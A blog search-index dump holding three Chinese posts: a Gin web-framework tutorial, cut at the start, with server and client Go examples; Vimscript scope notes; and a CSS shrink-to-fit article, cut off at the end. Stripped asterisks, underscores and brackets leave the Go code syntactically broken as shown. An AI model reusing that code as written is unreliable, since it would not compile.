router.POST(\"/test2\", func2)\n    // 绑定端口是8888\n    router.Run(\":8888\")\n}\n客户端代码是:\nfunc main(){\n    // 调用最基本的GET,并获得返回值\n    resp, := http.Get(\"http://0.0.0.0:8888/test1\")\n    helpRead(resp)\n\n    // 调用最基本的POST,并获得返回值\n    resp, = http.Post(\"http://0.0.0.0:8888/test2\", \"\",strings.NewReader(\"\"))\n    helpRead(resp)\n}\n在服务端, 实例化了一个router, 然后使用GET和POST方法分别注册了两个服务, 当我们使用HTTP GET方法的时候会使用GET注册的函数, 如果使用HTTP POST的方法, 那么会使用POST注册的函数. gin支持所有的HTTP的方法例如: GET, POST, PUT, PATCH, DELETE 和 OPTIONS等. 看客户端中的代码, 当调用http.Get(\"http://0.0.0.0:8888/test1\")的时候, 服务端接收到请求, 并根据/test1将请求路由到func1函数进行 处理. 同理, 调用http.Post(\"http://0.0.0.0:8888/test2\", \"\",strings.NewReader(\"\"))时候, 会使用func2函数处理. 在func1和func2中, 使用gin.Context填充了一个String的回复. 当然也支持JSON, XML, HTML等其他一些格式数据. 当执行c.String或者c.JSON时, 相当于向http的回复缓冲区写入了 一些数据. 最后调用router.Run(\":8888\")开始进行监听,Run的核心代码是:\nfunc (engine Engine) Run(addr string) (err error) {\n    debugPrint(\"Listening and serving HTTP on %s\\n\", addr)\n    defer func() { debugPrintError(err) }()\n    // 核心代码\n    err = http.ListenAndServe(addr, engine)\n    return\n}\n其本质就是http.ListenAndServe(addr, engine).\n注意: helpRead函数是用于读取response的Body的函数, 你可以自己定义, 本文中此函数定义为:\n// 用于读取resp的body\nfunc helpRead(resp http.Response)  {\n    defer resp.Body.Close()\n    body, err := ioutil.ReadAll(resp.Body)\n    if err != nil {\n        fmt.Println(\"ERROR2!: \", err)\n    }\n    fmt.Println(string(body))\n}\n\n2 传递参数\n\n传递参数有几种方法, 对应到gin使用几种不同的方式来解析.\n\n第一种: 使用gin.Context中的Param方法解析\n\n对应的服务端代码为:\n// func3: 处理带参数的path-GET\nfunc func3(c gin.Context)  {\n    // 回复一个200 OK\n    // 获取传入的参数\n    name := c.Param(\"name\")\n    passwd := c.Param(\"passwd\")\n    c.String(http.StatusOK, \"参数:%s %s  test3 OK\", name, passwd)\n}\n// func4: 处理带参数的path-POST\nfunc func4(c gin.Context)  {\n    // 回复一个200 OK\n    // 获取传入的参数\n    name := c.Param(\"name\")\n    passwd := c.Param(\"passwd\")\n    c.String(http.StatusOK, \"参数:%s %s  test4 OK\", name, passwd)\n}\n// func5: 注意':'和''的区别\nfunc func5(c gin.Context)  {\n    // 回复一个200 OK\n    // 获取传入的参数\n    name := c.Param(\"name\")\n    passwd := c.Param(\"passwd\")\n    c.String(http.StatusOK, \"参数:%s %s  test5 OK\", name, passwd)\n}\n\nfunc main(){\n    router := gin.Default()\n    // TODO:注意':'必须要匹配,''选择匹配,即存在就匹配,否则可以不考虑\n    router.GET(\"/test3/:name/:passwd\", func3)\n    router.POST(\"/test4/:name/:passwd\", func4)\n    router.GET(\"/test5/:name/passwd\", func5)\n\n    router.Run(\":8888\")\n}\n客户端测试代码是:\nfunc main() {\n    // GET传参数,使用gin的Param解析格式: /test3/:name/:passwd\n    resp, = http.Get(\"http://0.0.0.0:8888/test3/name=TAO/passwd=123\")\n    helpRead(resp)\n\n    // POST传参数,使用gin的Param解析格式: /test3/:name/:passwd\n    resp, = http.Post(\"http://0.0.0.0:8888/test4/name=PT/passwd=456\", \"\",strings.NewReader(\"\"))\n    helpRead(resp)\n\n    // 注意Param中':'和''的区别\n    resp, = http.Get(\"http://0.0.0.0:8888/test5/name=TAO/passwd=789\")\n    helpRead(resp)\n    resp, = http.Get(\"http://0.0.0.0:8888/test5/name=TAO/\")\n    helpRead(resp)\n}\n\n注意上面定义参数的方法有两个辅助符号: ':'和''. 如果使用':'参数方法, 那么这个参数是必须要匹配的, 例如上面的router.GET(\"/test3/:name/:passwd\", func3), 当请求URL是 类似于http://0.0.0.0:8888/test3/name=TAO/passwd=123这样的参会被匹配, 如果是http://0.0.0.0:8888/test3/name=TAO 或者http://0.0.0.0:8888/test3/passwd=123是不能匹配的. 但是如果使用''参数, 那么这个参数是可选的. router.GET(\"/test5/:name/passwd\", func5) 可以匹配http://0.0.0.0:8888/test5/name=TAO/passwd=789, 也可以匹配http://0.0.0.0:8888/test5/name=TAO/. 需要注意的一点是, 下面这个URL是不是能够 匹配呢? http://0.0.0.0:8888/test5/name=TAO, 注意TAO后面没有'/', 这个其实就要看有没有一个路由是到http://0.0.0.0:8888/test5/name=TAO路径的, 如果有, 那么指定的那个函数进行处理, 如果没有http://0.0.0.0:8888/test5/name=TAO会被重定向到http://0.0.0.0:8888/test5/name=TAO/, 然后被当前注册的函数进行处理.\n\n第二种: 使用gin.Context中的Query方法解析\n\n这个类似于正常的URL中的参数传递, 先看服务端代码:\n\n// 使用Query获取参数\nfunc func6(c gin.Context)  {\n    // 回复一个200 OK\n    // 获取传入的参数\n    name := c.Query(\"name\")\n    passwd := c.Query(\"passwd\")\n    c.String(http.StatusOK, \"参数:%s %s  test6 OK\", name, passwd)\n}\n// 使用Query获取参数\nfunc func7(c gin.Context)  {\n    // 回复一个200 OK\n    // 获取传入的参数\n    name := c.Query(\"name\")\n    passwd := c.Query(\"passwd\")\n    c.String(http.StatusOK, \"参数:%s %s  test7 OK\", name, passwd)\n}\n\nfunc main(){\n    router := gin.Default()\n    // 使用gin的Query参数形式,/test6?firstname=Jane\u0026lastname=Doe\n    router.GET(\"/test6\", func6)\n    router.POST(\"/test7\", func7)\n\n    router.Run(\":8888\")\n}\n客户端测试代码是:\n\nfunc main() {\n    // 使用Query获取参数形式/test6?firstname=Jane\u0026lastname=Doe\n    resp, = http.Get(\"http://0.0.0.0:8888/test6?name=BBB\u0026passwd=CCC\")\n    helpRead(resp)\n    resp, = http.Post(\"http://0.0.0.0:8888/test7?name=DDD\u0026passwd=EEE\", \"\",strings.NewReader(\"\"))\n    helpRead(resp)\n}\n这种方法的参数也是接在URL后面, 形如http://0.0.0.0:8888/test6?name=BBB\u0026passwd=CCC. 服务器可以使用name := c.Query(\"name\")这种 方法来解析参数.\n\n第三种: 使用gin.Context中的PostForm方法解析\n\n我们需要将参数放在请求的Body中传递, 而不是URL中. 先看服务端代码:\n\n// 参数是form中获得,即从Body中获得,忽略URL中的参数\nfunc func8(c gin.Context)  {\n    message := c.PostForm(\"message\")\n    extra := c.PostForm(\"extra\")\n    nick := c.DefaultPostForm(\"nick\", \"anonymous\")\n\n    c.JSON(200, gin.H{\n        \"status\":  \"test8:posted\",\n        \"message\": message,\n        \"nick\":    nick,\n        \"extra\": extra,\n    })\n}\n\nfunc main(){\n    router := gin.Default()\n    // 使用postform形式,注意必须要设置Post的type,\n    // 同时此方法中忽略URL中带的参数,所有的参数需要从Body中获得\n    router.POST(\"/test8\", func8)\n\n    router.Run(\":8888\")\n}\n客户端代码是:\n\nfunc main() {\n    // 使用postform形式,注意必须要设置Post的type,同时此方法中忽略URL中带的参数,所有的参数需要从Body中获得\n    resp, = http.Post(\"http://0.0.0.0:8888/test8\", \"application/x-www-form-urlencoded\",strings.NewReader(\"message=8888888\u0026extra=999999\"))\n    helpRead(resp)\n}\n由于我们使用了request Body, 那么就需要指定Body中数据的形式, 此处是form格式, 即application/x-www-form-urlencoded. 常见的几种http提交数据方式有: application/x-www-form-urlencoded; multipart/form-data; application/json; text/xml. 具体使用请google.\n在服务端, 使用message := c.PostForm(\"message\")方法解析参数, 然后进行处理.\n\n3 传输文件\n\n下面测试从client传输文件到server. 传输文件需要使用multipart/form-data格式的数据, 所有需要设定Post的类型是multipart/form-data.\n首先看服务端代码:\n\n// 接收client上传的文件\n// 从FormFile中获取相关的文件data!\n// 然后写入本地文件\nfunc func9(c gin.Context) {\n    // 注意此处的文件名和client处的应该是一样的\n    file, header , err := c.Request.FormFile(\"uploadFile\")\n    filename := header.Filename\n    fmt.Println(header.Filename)\n    // 创建临时接收文件\n    out, err := os.Create(\"copy\"+filename)\n    if err != nil {\n        log.Fatal(err)\n    }\n    defer out.Close()\n    // Copy数据\n    , err = io.Copy(out, file)\n    if err != nil {\n        log.Fatal(err)\n    }\n    c.String(http.StatusOK, \"upload file success\")\n}\n\nfunc main(){\n    router := gin.Default()\n    // 接收上传的文件,需要使用\n    router.POST(\"/upload\", func9)\n\n    router.Run(\":8888\")\n}\n客户端代码是:\n\nfunc main() {\n    // 上传文件POST\n    // 下面构造一个文件buf作为POST的BODY\n    buf := new(bytes.Buffer)\n    w := multipart.NewWriter(buf)\n    fw, := w.CreateFormFile(\"uploadFile\", \"images.png\") //这里的uploadFile必须和服务器端的FormFile-name一致\n    fd, := os.Open(\"images.png\")\n    defer fd.Close()\n    io.Copy(fw, fd)\n    w.Close()\n    resp, = http.Post(\"http://0.0.0.0:8888/upload\", w.FormDataContentType(), buf)\n    helpRead(resp)\n}\n首先客户端本地需要有一张\"images.png\"图片, 同时需要创建一个Form, 并将field-name命名为\"uploadFile\", file-name命名为\"images.png\". 在服务端, 通过\"uploadFile\"可以得到文件信息. 客户端继续将图片数据copy到创建好的Form中, 将数据数据Post出去, 注意数据的类型指定! 在服务端, 通过file, header , err := c.Request.FormFile(\"uploadFile\")获得文件信息, file中就是文件数据, 将其拷贝到本地文件, 完成文件传输.\n\n4 binding数据\n\ngin内置了几种数据的绑定例如JSON, XML等. 简单来说, 即根据Body数据类型, 将数据赋值到指定的结构体变量中. (类似于序列化和反序列化)\n看服务端代码:\n\n// Binding数据\n// 注意:后面的form:user表示在form中这个字段是user,不是User, 同样json:user也是\n// 注意:binding:\"required\"要求这个字段在client端发送的时候必须存在,否则报错!\ntype Login struct {\n    User     string form:\"user\" json:\"user\" binding:\"required\"\n    Password string form:\"password\" json:\"password\" binding:\"required\"\n}\n// bind JSON数据\nfunc funcBindJSON(c gin.Context) {\n    var json Login\n    // binding JSON,本质是将request中的Body中的数据按照JSON格式解析到json变量中\n    if c.BindJSON(\u0026json) == nil {\n        if json.User == \"TAO\" \u0026\u0026 json.Password == \"123\" {\n            c.JSON(http.StatusOK, gin.H{\"JSON=== status\": \"you are logged in\"})\n        } else {\n            c.JSON(http.StatusUnauthorized, gin.H{\"JSON=== status\": \"unauthorized\"})\n        }\n    } else {\n        c.JSON(404, gin.H{\"JSON=== status\": \"binding JSON error!\"})\n    }\n}\n\n// 下面测试bind FORM数据\nfunc funcBindForm(c gin.Context) {\n    var form Login\n    // 本质是将c中的request中的BODY数据解析到form中\n\n    // 方法一: 对于FORM数据直接使用Bind函数, 默认使用使用form格式解析,if c.Bind(\u0026form) == nil\n    // 方法二: 使用BindWith函数,如果你明确知道数据的类型\n    if c.BindWith(\u0026form, binding.Form) == nil{\n        if form.User == \"TAO\" \u0026\u0026 form.Password == \"123\" {\n            c.JSON(http.StatusOK, gin.H{\"FORM=== status\": \"you are logged in\"})\n        } else {\n            c.JSON(http.StatusUnauthorized, gin.H{\"FORM=== status\": \"unauthorized\"})\n        }\n    } else {\n        c.JSON(404, gin.H{\"FORM=== status\": \"binding FORM error!\"})\n    }\n}\n\nfunc main(){\n    router := gin.Default()\n    // 下面测试bind JSON数据\n    router.POST(\"/bindJSON\", funcBindJSON)\n\n    // 下面测试bind FORM数据\n    router.POST(\"/bindForm\", funcBindForm)\n\n    // 下面测试JSON,XML等格式的rendering\n    router.GET(\"/someJSON\", func(c gin.Context) {\n        c.JSON(http.StatusOK, gin.H{\"message\": \"hey, budy\", \"status\": http.StatusOK})\n    })\n\n    router.GET(\"/moreJSON\", func(c gin.Context) {\n        // 注意:这里定义了tag指示在json中显示的是user不是User\n        var msg struct {\n            Name    string json:\"user\"\n            Message string\n            Number  int\n        }\n        msg.Name = \"TAO\"\n        msg.Message = \"hey, budy\"\n        msg.Number = 123\n        // 下面的在client的显示是\"user\": \"TAO\",不是\"User\": \"TAO\"\n        // 所以总体的显示是:{\"user\": \"TAO\", \"Message\": \"hey, budy\", \"Number\": 123\n        c.JSON(http.StatusOK, msg)\n    })\n\n    //  测试发送XML数据\n    router.GET(\"/someXML\", func(c gin.Context) {\n        c.XML(http.StatusOK, gin.H{\"name\":\"TAO\", \"message\": \"hey, budy\", \"status\": http.StatusOK})\n    })\n\n    router.Run(\":8888\")\n}\n客户端代码:\n\nfunc main() {\n    // 下面测试binding数据\n    // 首先测试binding-JSON,\n    // 注意Body中的数据必须是JSON格式\n    resp, = http.Post(\"http://0.0.0.0:8888/bindJSON\", \"application/json\", strings.NewReader(\"{\\\"user\\\":\\\"TAO\\\", \\\"password\\\": \\\"123\\\"}\"))\n    helpRead(resp)\n\n    // 下面测试bind FORM数据\n    resp, = http.Post(\"http://0.0.0.0:8888/bindForm\", \"application/x-www-form-urlencoded\", strings.NewReader(\"user=TAO\u0026password=123\"))\n    helpRead(resp)\n\n    // 下面测试接收JSON和XML数据\n    resp, = http.Get(\"http://0.0.0.0:8888/someJSON\")\n    helpRead(resp)\n    resp, = http.Get(\"http://0.0.0.0:8888/moreJSON\")\n    helpRead(resp)\n    resp, = http.Get(\"http://0.0.0.0:8888/someXML\")\n    helpRead(resp)\n}\n客户端发送请求, 在服务端可以直接使用c.BindJSON绑定到Json结构体上. 或者使用BindWith函数也可以, 但是需要指定绑定的数据类型, 例如JSON, XML, HTML等. Bind函数的本质是读取request中的body数据, 拿BindJSON为例, 其核心代码是:\n\nfunc ( jsonBinding) Bind(req http.Request, obj interface{}) error {\n    // 核心代码: decode请求的body到obj中\n    decoder := json.NewDecoder(req.Body)\n    if err := decoder.Decode(obj); err != nil {\n        return err\n    }\n    return validate(obj)\n}\n\n5 router group\n\nrouter group是为了方便前缀相同的URL的管理, 其基本用法如下.\n首先看服务端代码:\n\n// router GROUP - GET测试\nfunc func10(c gin.Context)  {\n    c.String(http.StatusOK, \"test10 OK\")\n}\nfunc func11(c gin.Context)  {\n    c.String(http.StatusOK, \"test11 OK\")\n}\n\n// router GROUP - POST测试\nfunc func12(c gin.Context)  {\n    c.String(http.StatusOK, \"test12 OK\")\n}\nfunc func13(c gin.Context)  {\n    c.String(http.StatusOK, \"test13 OK\")\n}\n\nfunc main(){\n    router := gin.Default()\n    // router Group是为了将一些前缀相同的URL请求放在一起管理\n    group1 := router.Group(\"/g1\")\n    group1.GET(\"/read1\", func10)\n    group1.GET(\"/read2\", func11)\n\n    group2 := router.Group(\"/g2\")\n    group2.POST(\"/write1\", func12)\n    group2.POST(\"/write2\", func13)\n\n    router.Run(\":8888\")\n}\n客户端测试代码:\n\nfunc main() {\n    // 下面测试router 的GROUP\n    resp, = http.Get(\"http://0.0.0.0:8888/g1/read1\")\n    helpRead(resp)\n    resp, = http.Get(\"http://0.0.0.0:8888/g1/read2\")\n    helpRead(resp)\n    resp, = http.Post(\"http://0.0.0.0:8888/g2/write1\", \"\", strings.NewReader(\"\"))\n    helpRead(resp)\n    resp, = http.Post(\"http://0.0.0.0:8888/g2/write2\", \"\", strings.NewReader(\"\"))\n    helpRead(resp)\n}\n在服务端代码中, 首先创建了一个组group1 := router.Group(\"/g1\"), 并在这个组下注册了两个服务, group1.GET(\"/read1\", func10) 和group1.GET(\"/read2\", func11), 那么当使用http://0.0.0.0:8888/g1/read1和http://0.0.0.0:8888/g1/read2访问时, 是可以路由 到上面注册的位置的. 同理对于group2 := router.Group(\"/g2\")也是一样的.\n\n6 静态文件服务\n\n可以向客户端展示本地的一些文件信息, 例如显示某路径下地文件. 服务端代码是:\n\nfunc main(){\n    router := gin.Default()\n    // 下面测试静态文件服务\n    // 显示当前文件夹下的所有文件/或者指定文件\n    router.StaticFS(\"/showDir\", http.Dir(\".\"))\n    router.Static(\"/files\", \"/bin\")\n    router.StaticFile(\"/image\", \"./assets/1.png\")\n\n    router.Run(\":8888\")\n}\n首先你需要在服务器的路径下创建一个assert文件夹, 并且放入1.png文件. 如果已经存在, 请忽略.\n测试代码: 请在浏览器中输入0.0.0.0:8888/showDir, 显示的是服务器当前路径下地文件信息:\n\n1\n\n输入0.0.0.0:8888/files, 显示的是/bin目录下地文件信息:\n\n2\n\n输入0.0.0.0:8888/image, 显示的是服务器下地./assets/1.png图片:\n\n3\n\n7 加载模板templates\n\ngin支持加载HTML模板, 然后根据模板参数进行配置并返回相应的数据.\n看服务端代码\n\nfunc main(){\n    router := gin.Default()\n    // 下面测试加载HTML: LoadHTMLTemplates\n    // 加载templates文件夹下所有的文件\n    router.LoadHTMLGlob(\"templates/\")\n    // 或者使用这种方法加载也是OK的: router.LoadHTMLFiles(\"templates/template1.html\", \"templates/template2.html\")\n    router.GET(\"/index\", func(c gin.Context) {\n        // 注意下面将gin.H参数传入index.tmpl中!也就是使用的是index.tmpl模板\n        c.HTML(http.StatusOK, \"index.tmpl\", gin.H{\n            \"title\": \"GIN: 测试加载HTML模板\",\n        })\n    })\n\n    router.Run(\":8888\")\n}\n客户端测试代码是:\n\nfunc main() {\n    // 测试加载HTML模板\n    resp, = http.Get(\"http://0.0.0.0:8888/index\")\n    helpRead(resp)\n}\n在服务端, 我们需要加载需要的templates, 这里有两种方法: 第一种使用LoadHTMLGlob加载所有的正则匹配的模板, 本例中使用的是, 即匹配所有文件, 所以加载的是 templates文件夹下所有的模板. 第二种使用LoadHTMLFiles加载指定文件. 在本例服务器路径下有一个templates目录, 下面有一个index.tmpl模板, 模板的 内容是:\n\nhtml\n    h1\n       { { .title } }\n    /h1\n/html\n当客户端请求/index时, 服务器使用这个模板, 并填充相应的参数, 此处参数只有title, 然后将HTML数据返回给客户端.\n你也可以在浏览器请求0.0.0.0:8888/index, 效果如下图所示:\n\n4\n\n8 重定向\n\n重定向相对比较简单, 服务端代码是:\n\nfunc main(){\n    router := gin.Default()\n    // 下面测试重定向\n    router.GET(\"/redirect\", func(c gin.Context) {\n        c.Redirect(http.StatusMovedPermanently, \"http://shanshanpt.github.io/\")\n    })\n\n    router.Run(\":8888\")\n}\n客户端测试代码是:\n\nfunc main() {\n    // 下面测试重定向\n    resp, = http.Get(\"http://0.0.0.0:8888/redirect\")\n    helpRead(resp)\n}\n当我们请求http://0.0.0.0:8888/redirect的时候, 会重定向到http://shanshanpt.github.io/这个站点.\n\n9 使用middleware\n\n这里使用了两个例子, 一个是logger, 另一个是BasiAuth, 具体看服务器代码:\n\nfunc Logger() gin.HandlerFunc {\n    return func(c gin.Context) {\n        t := time.Now()\n        // 设置example变量到Context的Key中,通过Get等函数可以取得\n        c.Set(\"example\", \"12345\")\n        // 发送request之前\n        c.Next()\n        // 发送request之后\n        latency := time.Since(t)\n        log.Print(latency)\n\n        // 这个c.Write是ResponseWriter,我们可以获得状态等信息\n        status := c.Writer.Status()\n        log.Println(status)\n    }\n}\n\nfunc main(){\n    router := gin.Default()\n    // 1\n    router.Use(Logger())\n    router.GET(\"/logger\", func(c gin.Context) {\n        example := c.MustGet(\"example\").(string)\n        log.Println(example)\n    })\n\n    // 2\n    // 下面测试BasicAuth()中间件登录认证\n    //\n    var secrets = gin.H{\n        \"foo\":    gin.H{\"email\": \"foo@bar.com\", \"phone\": \"123433\"},\n        \"austin\": gin.H{\"email\": \"austin@example.com\", \"phone\": \"666\"},\n        \"lena\":   gin.H{\"email\": \"lena@guapa.com\", \"phone\": \"523443\"},\n    }\n    // Group using gin.BasicAuth() middleware\n    // gin.Accounts is a shortcut for map[string]string\n    authorized := router.Group(\"/admin\", gin.BasicAuth(gin.Accounts{\n        \"foo\":    \"bar\",\n        \"austin\": \"1234\",\n        \"lena\":   \"hello2\",\n        \"manu\":   \"4321\",\n    }))\n    // 请求URL: 0.0.0.0:8888/admin/secrets\n    authorized.GET(\"/secrets\", func(c gin.Context) {\n        // get user, it was set by the BasicAuth middleware\n        user := c.MustGet(gin.AuthUserKey).(string)\n        if secret, ok := secrets[user]; ok {\n            c.JSON(http.StatusOK, gin.H{\"user\": user, \"secret\": secret})\n        } else {\n            c.JSON(http.StatusOK, gin.H{\"user\": user, \"secret\": \"NO SECRET :(\"})\n        }\n    })\n\n    router.Run(\":8888\")\n}\n客户端测试代码是:\n\nfunc main() {\n    // 下面测试使用中间件\n    resp, = http.Get(\"http://0.0.0.0:8888/logger\")\n    helpRead(resp)\n\n    // 测试验证权限中间件BasicAuth\n    resp, = http.Get(\"http://0.0.0.0:8888/admin/secrets\")\n    helpRead(resp)\n}\n服务端使用Use方法导入middleware, 当请求/logger来到的时候, 会执行Logger(), 并且我们知道在GET注册的时候, 同时注册了匿名函数, 所有请看Logger函数中存在一个c.Next()的用法, 它是取出所有的注册的函数都执行一遍, 然后再回到本函数中, 所以, 本例中相当于是先执行了 c.Next()即注册的匿名函数, 然后回到本函数继续执行. 所以本例的Print的输出顺序是:\nlog.Println(example)\nlog.Print(latency)\nlog.Println(status)\n如果将c.Next()放在log.Print(latency)后面, 那么log.Println(example)和log.Print(latency)执行的顺序就调换了. 所以一切都取决于c.Next()执行的位置. c.Next()的核心代码如下:\n\n// Next should be used only in the middlewares.\n// It executes the pending handlers in the chain inside the calling handler.\n// See example in github.\nfunc (c Context) Next() {\n    c.index++\n    s := int8(len(c.handlers))\n    for ; c.index \u003c s; c.index++ {\n        c.handlersc.index\n    }\n}\n它其实是执行了后面所有的handlers.\n关于使用gin.BasicAuth() middleware, 可以直接使用一个router group进行处理, 本质和logger一样.\n\n10 绑定http server\n\n之前所有的测试中, 我们都是使用router.Run(\":8888\")开始执行监听, 其实还有两种方法:\n\n// 方法二\nhttp.ListenAndServe(\":8888\", router)\n\n// 方法三:\nserver := \u0026http.Server{\n    Addr:           \":8888\",\n    Handler:        router,\n    ReadTimeout:    10  time.Second,\n    WriteTimeout:   10 * time.Second,\n    MaxHeaderBytes: 1 \u003c\u003c 20,\n}\nserver.ListenAndServe()\n至此, gin最基本的一些应用都整理完了, 下面就具体看看代码中的一些实现. 有时间再记录吧.\n\n3.参考:\ngin-github","tags":null},{"location":"//blog.pytool.com/Edit/vim 脚本简述","title":"vim 脚本简述","text":"笨方法学Vimscript\nvim 脚本简述\n1.1 函数调用的两种方式\n\n有两种调用VimScript函数的方式。\n\n（1）不关心返回值\n    call search(\"Date: \", \"W\")  \n使用关键字call 来显式调用函数。\n（2）关心返回值\n    let line = getline(\".\")  \n    let repl = substitute(line, '\\a', \"\", \"g\")  \n    call setline(\".\", repl)  \n上例子，getline(\".\")返回当前光标所在的行文本，substitue()则返回替换后的文本， 这种情况下自动调用函数，无需使用call。\n\n其实函数调用的call与变量赋值的let类似，看起来好像真的是多余的，C和PHP都没有这种用法，也能工作的很好啊，搞不懂VimScript的开发者是如何想的。\n\n2.1 基本变量命名空间\n在VimScript中默认的作用域是全局作用域，也就是说你在一个脚本文件中定义了一个变量，在其他脚本中也可以读取和修改这个变量。在任何编程语言中，全局变量的滥用都会造成混乱，所以VimScript提供了更多的非全局作用域。\n\n    s:name 脚本文件作用域，此时s:name这个变量只在当前脚本文件中有效，其他的脚本文件中如果也定义了同名的s:name也没关系，因为这两者彼此独立。这一点与C中的static关键字类似。\n    b:name 缓冲区作用域，b:name只在指定的缓冲区中有效\n    w:name 窗口作用域，w:name只在指定的窗口中有效\n    g:name 全局作用域，函数外定义的变量的默认值\n    v:name vim预定义的变量，注意预定义变量不同于vim的选项(option)变量。\n    l:name 函数内部的局部变量，函数内部定义的变量的默认值\n\n注意这些作用域只针对变量名，而不能作用于函数名。\n\n表 1. Vimscript 变量范围\n前缀 \t含义\ng: varname \t变量为全局变量\ns: varname \t变量的范围为当前的脚本文件\nw: varname \t变量的范围为当前的编辑器窗口\nt: varname \t变量的范围为当前的编辑器选项卡\nb: varname \t变量的范围为当前的编辑器缓冲区\nl: varname \t变量的范围为当前的函数\na: varname \t变量是当前函数的一个参数\nv: varname \t变量是 Vim 的预定义变量\n\n还有一些伪变量（pseudovariables），脚本可以使用它们访问 Vim 提供的其他类型的值容器。表 2 对此进行了总结。\n\n表 2. Vimscript 伪变量\n前缀 \t含义\n\u0026 varname \t一个 Vim 选项（如果指定的话，则为本地选项，否则为全局选项）\n\u0026l: varname \t本地 Vim 选项\n\u0026g: varname \t全局 Vim 选项\n@ varname \t一个 Vim 注册器\n$ varname \t一个环境变量\n\n“option” 伪变量非常有用。例如，可以设置两个键映射（key-map）来增加或减小当前的表空间，如下所示：\n\nnmap silent ]] :let \u0026tabstop += 1CR\n\nnmap silent [[ :let \u0026tabstop -= \u0026tabstop   1 ? 1 : 0CR\n\noption  如果变量名以\u0026开头，那么这个变量是一个vim内部变量。vim提供了很多可以配置的选项，也被称为vim内部变量。\n\t\t同一个名称的内部变量往往有很多副本，一个是全局的，还有buffer和window局部的，而且提供了不同的读写命令set和setlocal。\n\t\t内部变量共使用了三种数据类型：boolean，Number, String。其实VimScript并不支持boolean，而是用Number模仿而已。\n\n改变一个option有两种方法：一是使用set命令，如 set number， set tabstop=4； 二是给变量直接赋值，如 let \u0026number=1, let \u0026tabstop=4。两种方法达到的效果是一样的。不过需要注意的是：\n\n\t\tset命令可以使用简写形式的option名字，如set nu，而直接赋值必须使用完整的内部变量名称；\n\t\t直接赋值时要在变量名之前添加\u0026，否则会新建一个同名变量，而不是使用vim的内部变量。如 let number=1不会修改vim的number内部变量。\n\nregister 如果变量名以@开头，那么这本变量是暂存区变量，注意register在这里的含义与CPU中的寄存器没有直接关系。\n\nregister其实就是一块内存，用来存放各种临时性的东西，比如拷贝的文本，文件的名称，最近删除的文本等等。共有9种类型的register。分别是：\n（1）无名register \"\" ， 在vim中register使用引号开头\n（2）以数字为名的register，\"0到\"9，共10个\n（3）小删除register, “-（连接符）\n（4）以字母为名的register, ”a到\"z，共26个\n（5）只读register，共有4个，分别是 \", ，“。，”%，\"#\n（6）表达式register，\"=\n（7）选择与删除register，共3个，分别是 \"，\"+以及\"~\n（8）黑洞register, “（下划线），注意与\"-区别\n（9）上次查找模式register, ”/\n这些register中，有一些是vim自身使用的，有些则是共用户使用的。\n在VimScript中，使用@+暂存区名的语法来读取和设置暂存区。如下：\n[plain] view plain copy\n\necho @\"  \nlet @/ = \"hello\"  \" 写入register  \necho type(@/)  \necho type(@_)  \n\n通过实验得知，所有的register类型变量的数据类型都是String。","tags":null},{"location":"//blog.pytool.com/Post/前端技术/CSS十日谈/2013-12-28-the-ninth-day-talk-about-text-overflow","title":"第九天，谈谈【text-overflow】","text":"---\n\ntext-overflow 的作用:","tags":null},{"location":"//blog.pytool.com/Post/前端技术/CSS十日谈/2013-12-23-the-seventh-day-talk-about-shrink-to-fit","title":"第七天，谈谈【shrink-to-fit】","text":"什么是 shrink-to-fit\nshrink-to-fit指的是块级元素只占据内容所需要的宽度。Shrink-To-Fit，字面意思就是收缩包围。\n为什么需要shrink-to-fit \n我们都知道在默认情况下，块级元素（更确切的说是display属性值为block或list-item的元素）在横向上会占据它所能占据的最大宽度。但是，如果我只想让块元素和它所包含的内容一样宽，该怎么做呢？最容易想到的方法是：设置width。可是，如果内容是动态的，宽度不固定的呢？这时，我们就可以利用shrink-to-fit了。\n\n如何使块元素shrink-to-fit\n 下面我们将介绍五种常见的使块元素shrink-to-fit的方式，并顺带介绍一个很常见的需求：如何使shrink-to-fit的元素相对于父元素居中显示。\n\n 方式一：通过float属性\n\n 示例代码一：\n iframe width=\"100%\" height=\"300\" src=\"http://jsfiddle.net/zicai/9nJDc/embedded/\" allowfullscreen=\"allowfullscreen\" frameborder=\"0\"/iframe\n 这应该是使用最普遍的一种方式，因为主流浏览器都支持，并且浮动带来的副作用很小（一般通过清除浮动即可消除副作用）。\n\n 但如果你想让shrink-to-fit的元素居中显示，可能就要换一种方式了，比如下面这种。\n\n 方式二：通过display:inline\n\n 示例代码二：\n iframe width=\"100%\" height=\"300\" src=\"http://jsfiddle.net/zicai/9nJDc/1/embedded/\" allowfullscreen=\"allowfullscreen\" frameborder=\"0\"/iframe\n 把shrink元素设置成display:inline就可以使它和内容一样宽。而通过container的text-align:center即可使其居中显示。但是display:inline带来的副作用也有很多，例如：\n\n  将无法设置shrink元素的width和height\n  将无法设置shrink元素的垂直padding\n  如果shrink元素包含多行内容，并且shrink元素有边框或背景时，效果会一团糟。如下：\n\n iframe width=\"100%\" height=\"300\" src=\"http://jsfiddle.net/zicai/9nJDc/2/embedded/\" allowfullscreen=\"allowfullscreen\" frameborder=\"0\"/iframe\n\n 方式三：通过display:inline-block\n\n  示例代码三：\n iframe width=\"100%\" height=\"300\" src=\"http://jsfiddle.net/zicai/9nJDc/3/embedded/\" allowfullscreen=\"allowfullscreen\" frameborder=\"0\"/iframe\n\n display:inline-block在现代浏览器中即可使元素shrink-to-fit，为了在IE6、7中达到同样的效果，需要用display: inline;zoom: 1;hack一下。详见上一篇谈谈【inline-block】\n\n 用这种方式shrink-to-fit的元素，通过设置container的text-align:center即可使其居中显示。\n\n 方式四：通过position:absolute\n\n 示例代码四：\n iframe width=\"100%\" height=\"300\" src=\"http://jsfiddle.net/zicai/9nJDc/4/embedded/\" allowfullscreen=\"allowfullscreen\" frameborder=\"0\"/iframe\n 这应该是用的最少的一种方式，因为position:absolute会改变元素的定位方式，使元素脱离普通文档流。(由于固定定位position:fixed是绝对定位position:absolute的一种，所以position:fixed同样可以使元素shrink-to-fit，这里不再展开叙述)\n\n 方式五：通过display:table\n\n 示例代码五：\n iframe width=\"100%\" height=\"300\" src=\"http://jsfiddle.net/zicai/9nJDc/6/embedded/\" allowfullscreen=\"allowfullscreen\" frameborder=\"0\"/iframe\n\n display:table即可使元素shrink-to-fit，再加上margin: 0 auto即可使其居中显示。可惜的是IE6、7不支持这种方式。\n\n除了上面这五种常见的方式，还有一些不常用的，例如：display: table-cell、 display: inline-table。\n\n在IE中也有一些和shrink-to-fit相关的bug，例如：当一个应该收缩包围的元素中包含一个拥有“layout”的块级元素时，会出现一些意想不到的现象，相关bug会在专栏Bug 